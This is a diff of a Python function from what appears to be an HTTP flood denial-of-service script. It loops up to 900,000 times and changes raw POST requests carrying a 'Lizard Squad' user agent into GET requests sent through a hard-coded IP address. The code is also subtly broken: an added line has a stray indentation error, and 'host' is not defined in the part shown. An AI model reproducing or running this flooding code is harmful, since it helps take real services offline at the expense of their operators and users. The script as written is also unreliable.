@@ -83,12 +83,11 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = httplib.HTTPConnection(url, 80)
+	 conn = httplib.HTTPConnection("64.233.162.104", 80)
 	try:
 		for i in range(900000):
 		
-			
-			request.send('POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Lizard Squad\r\n\r\n', host)
+			conn.request("GET", 'http://'+host+'/')
 	except socket.error:
 			#print e.code
 			set_flag(1)
@@ -96,7 +95,7 @@ def httpcall(url):
 			code=500
 	else:
 			inc_counter()
-			request.send('POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Lizard Squad\r\n\r\n', host)
+			conn.request("GET", 'http://'+host+'/')
 	return(code)		
 
 	
